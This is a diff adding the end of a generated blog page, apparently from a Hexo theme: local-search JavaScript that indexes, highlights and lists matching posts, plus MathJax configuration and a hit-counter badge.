+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  <div>
+    <a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fmok0102.github.io%2Fhit-counter&count_bg=%233D8CC8&title_bg=%23555555&icon=kickstarter.svg&icon_color=%23E7E7E7&title=hits&edge_flat=false"/></a>
+  </div>
+  <div></div>
+</body>
+</html>
+
